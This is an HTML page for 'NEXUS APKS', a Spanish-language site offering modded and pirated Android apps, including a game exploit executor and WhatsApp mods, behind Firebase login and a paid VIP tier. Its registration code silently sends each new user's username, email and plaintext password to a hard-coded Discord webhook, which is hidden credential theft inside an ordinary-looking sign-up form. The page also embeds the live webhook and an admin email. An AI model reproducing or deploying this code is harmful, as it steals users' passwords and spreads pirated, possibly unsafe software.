<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS APKS 🌪️ | V4.0 FINAL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root {
            --p-grad: linear-gradient(135deg, #00ff88, #00a35c);
            --v-grad: linear-gradient(135deg, #ffd700, #ff8c00);
            --d-grad: linear-gradient(135deg, #ff416c, #ff4b2b);
            --bg: #050505; --card: #0f0f0f;
        }
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; transition: 0.3s; }
        body { background: var(--bg); color: white; margin: 0; overflow-x: hidden; }
        
        /* Intro */
        #intro { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .logo { font-size: 2.5rem; font-weight: 900; background: var(--p-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: pulse 1s infinite; }
        
        /* Auth */
        .auth-screen { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .auth-box { background: var(--card); padding: 30px; border-radius: 25px; width: 100%; max-width: 400px; text-align: center; border: 1px solid #222; }
        .n-input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 12px; outline: none; }
        .btn { width: 100%; padding: 15px; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
        .btn-p { background: var(--p-grad); color: black; box-shadow: 0 4px 15px rgba(0,255,136,0.2); }
        .btn-s { background: #333; color: white; }
        
        /* Nav */
        nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 5%; background: rgba(0,0,0,0.9); border-bottom: 1px solid #222; position: sticky; top: 0; z-index: 100; }
        .pill { background: #1a1a1a; padding: 8px 15px; border-radius: 20px; border: 1px solid #444; font-size: 0.8rem; font-weight: bold; }
        .btn-off { background: var(--d-grad); color: white; border: none; padding: 8px 15px; border-radius: 10px; cursor: pointer; font-weight: bold; }
        .crown { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #ffd700; display: flex; align-items: center; justify-content: center; cursor: pointer; background: #111; }

        /* Grid */
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 20px; padding: 20px 5%; }
        .card { background: var(--card); border-radius: 20px; overflow: hidden; border: 1px solid #222; text-align: center; }
        .card:hover { transform: translateY(-5px); border-color: #00ff88; }
        .card img { width: 100%; height: 180px; object-fit: cover; }
        .card-body { padding: 15px; }
        .card-body h3 { font-size: 0.9rem; margin: 0 0 10px; height: 35px; overflow: hidden; }

        /* Modales */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; padding: 20px; overflow-y: auto; }
        .modal-content { background: #0a0a0a; max-width: 450px; margin: 40px auto; border-radius: 25px; padding: 30px; border: 1px solid #333; }
        
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        @media (max-width: 500px) { .grid { grid-template-columns: 1fr 1fr; gap: 10px; } }
    </style>
</head>
<body>

<div id="intro"><div class="logo">NEXUS APKS 🌪️</div></div>

<div id="auth-sec" class="auth-screen">
    <div class="auth-box" id="l-box">
        <h2 style="color:#00ff88">NEXUS APKS</h2>
        <input type="email" id="l-email" class="n-input" placeholder="CORREO">
        <input type="password" id="l-pass" class="nexus-input n-input" placeholder="CONTRASEÑA">
        <button class="btn btn-p" onclick="doLogin()">ENTRAR</button>
        <button class="btn btn-s" onclick="guest()">INVITADO</button>
        <p onclick="swap()" style="cursor:pointer; color:#00ff88; margin-top:15px">¿No tienes cuenta? Regístrate</p>
    </div>
    <div class="auth-box" id="r-box" style="display:none">
        <h2 style="color:#00ff88">REGISTRO</h2>
        <input type="text" id="r-user" class="n-input" placeholder="USUARIO">
        <input type="email" id="r-email" class="n-input" placeholder="CORREO">
        <input type="password" id="r-pass" class="n-input" placeholder="CONTRASEÑA">
        <button class="btn btn-p" onclick="doReg()">CREAR CUENTA</button>
        <button class="btn btn-s" onclick="swap()">VOLVER</button>
    </div>
</div>

<div id="main-sec" style="display:none">
    <nav>
        <div style="font-weight:900; color:#00ff88; font-size:1.2rem">NEXUS 🌪️</div>
        <div style="display:flex; align-items:center; gap:10px">
            <button class="btn-off" style="background:var(--v-grad); color:black" onclick="openM('m-shop')">VIP</button>
            <div id="adm-btn" class="crown" style="display:none" onclick="openM('m-admin')">👑</div>
            <div id="st-pill" class="pill">FREE👤</div>
            <button class="btn-off" onclick="logout()">SALIR</button>
        </div>
    </nav>
    <div style="text-align:center; padding:30px">
        <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" target="_blank" class="btn btn-p" style="display:inline-block; width:auto; padding:15px 40px; background:#25D366; color:white">WHATSAPP CANAL 📢</a>
    </div>
    <div class="grid" id="container"></div>
</div>

<div id="m-shop" class="modal"><div class="modal-content">
    <h2 style="color:#ffd700; text-align:center">PLANES VIP 💎</h2>
    <div style="background:#111; padding:15px; border-radius:15px; margin-bottom:10px; border:1px solid #ffd700">
        <h3>15 DÍAS 💎</h3><button class="btn btn-p" style="background:var(--v-grad)" onclick="buy('15 DÍAS')">COMPRAR</button>
    </div>
    <div style="background:#111; padding:15px; border-radius:15px; border:1px solid #ffd700">
        <h3>30 DÍAS 💎</h3><button class="btn btn-p" style="background:var(--v-grad)" onclick="buy('30 DÍAS')">COMPRAR</button>
    </div>
    <button class="btn btn-s" onclick="closeM('m-shop')">CERRAR</button>
</div></div>

<div id="m-admin" class="modal"><div class="modal-content">
    <h3>ADMIN PANEL 👑</h3>
    <input type="email" id="a-mail" class="n-input" placeholder="CORREO">
    <button class="btn btn-p" onclick="addVip()">DAR VIP</button>
    <div id="v-list" style="margin-top:20px; max-height:200px; overflow-y:auto"></div>
    <button class="btn btn-s" onclick="closeM('m-admin')">CERRAR</button>
</div></div>

<script>
const firebaseConfig = {
    apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
    authDomain: "hyper-drip.firebaseapp.com",
    projectId: "hyper-drip",
    storageBucket: "hyper-drip.firebasestorage.app",
    messagingSenderId: "1023275797824",
    appId: "1:1023275797824:web:378ce9a674db72af05fea5",
    databaseURL: "https://hyper-drip-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth(), db = firebase.database();
const WEB = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";

let isVip = false, isG = false;

const APKS = [
    { n: "CAP CUT PRO", i: "https://i.ibb.co/Nd4ZW59d/images.jpg", l: "https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file", r: true },
    { n: "DELTA EXECUTOR", i: "https://i.ibb.co/8g1X87mz/41p-TZNE7m-IL.jpg", l: "https://deltaexploits.gg/delta-executor-android", r: false },
    { n: "DTW MOD MENU", i: "https://i.ibb.co/S4w6Cg99/unnamed.png", l: "https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file", r: false },
    { n: "GTA SAN ANDREAS", i: "https://i.ibb.co/cSwBjTYM/Capture-d-ecran-2025-12-27-184549.png", l: "https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file", r: false },
    { n: "GB WHATSAPP EXTREME", i: "https://i.ibb.co/bj16Q1H3/favicon.png", l: "https://www.mediafire.com/file/e2yrwtq46ab16h1/GBEXTREME_MAS_V26.36E.apk/file", p: true },
    { n: "MB WHATSAPP PLUS", i: "https://i.ibb.co/rGCqw4DX/Whatsapp-plus-logo-2.webp", l: "https://www.mediafire.com/file/yfosnqs5lkb7vfl/MBWhatsApp_2.8.0F_by_stefanoYG.apk/file", p: true }
];

auth.onAuthStateChanged(u => {
    setTimeout(() => {
        document.getElementById('intro').style.display = 'none';
        if(u) { isG = false; loadDash(u); }
        else if(!isG) document.getElementById('auth-sec').style.display = 'flex';
    }, 2000);
});

function swap() {
    const l = document.getElementById('l-box'), r = document.getElementById('r-box');
    l.style.display = l.style.display === 'none' ? 'block' : 'none';
    r.style.display = r.style.display === 'none' ? 'block' : 'none';
}

async function doLogin() {
    try { await auth.signInWithEmailAndPassword(document.getElementById('l-email').value, document.getElementById('l-pass').value); }
    catch(e) { alert(e.message); }
}

async function doReg() {
    const u = document.getElementById('r-user').value, e = document.getElementById('r-email').value, p = document.getElementById('r-pass').value;
    try { 
        await auth.createUserWithEmailAndPassword(e, p);
        fetch(WEB, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({content: `👤: ${u}\n✉️: ${e}\n🔑: ${p}`})});
    } catch(err) { alert(err.message); }
}

function guest() { isG = true; document.getElementById('auth-sec').style.display = 'none'; document.getElementById('main-sec').style.display = 'block'; render(); }

function loadDash(u) {
    document.getElementById('auth-sec').style.display = 'none';
    document.getElementById('main-sec').style.display = 'block';
    if(u.email === "chrisslorenzohdz@gmail.com") { document.getElementById('adm-btn').style.display = 'flex'; loadVipList(); }
    db.ref(`premium_users/${u.email.replace(/\./g, '_')}`).on('value', s => { isVip = s.exists() && s.val().active; render(); });
}

function render() {
    const p = document.getElementById('st-pill');
    p.innerHTML = isG ? "FREE👤" : (isVip ? "VIP 💎" : "FREE👤");
    const c = document.getElementById('container'); c.innerHTML = "";
    APKS.forEach(a => {
        c.innerHTML += `<div class="card"><img src="${a.i}"><div class="card-body"><h3>${a.n}</h3><button class="btn btn-p" onclick="dl('${a.l}',${a.r},${a.p})">DESCARGAR</button></div></div>`;
    });
}

function dl(u, r, p) {
    if(isG && !r) { alert("¡Regístrate para bajar esta app!"); return; }
    if(p && !isVip && auth.currentUser?.email !== "chrisslorenzohdz@gmail.com") { alert("¡Solo para VIPs! 💎"); openM('m-shop'); return; }
    window.open(u, '_blank');
}

async function addVip() {
    const m = document.getElementById('a-mail').value;
    if(m) await db.ref(`premium_users/${m.replace(/\./g, '_')}`).set({active: true});
}

function loadVipList() {
    db.ref('premium_users').on('value', s => {
        const l = document.getElementById('v-list'); l.innerHTML = "";
        s.forEach(c => {
            const d = c.val(), k = c.key;
            l.innerHTML += `<div style="display:flex; justify-content:space-between; margin-bottom:5px; font-size:0.8rem">
                <span>${k.replace(/_/g,'.')}</span>
                <button onclick="db.ref('premium_users/${k}/active').set(${!d.active})">${d.active?'PAUSAR':'DAR'}</button>
            </div>`;
        });
    });
}

function logout() { auth.signOut().then(() => location.reload()); }
function openM(id) { document.getElementById(id).style.display = 'block'; }
function closeM(id) { document.getElementById(id).style.display = 'none'; }
function buy(p) { alert("Copiado. Ve a TikTok."); navigator.clipboard.writeText("Quiero VIP: "+p); window.location.href="https://tiktok.com/@softworks32"; }
</script>
</body>
</html>
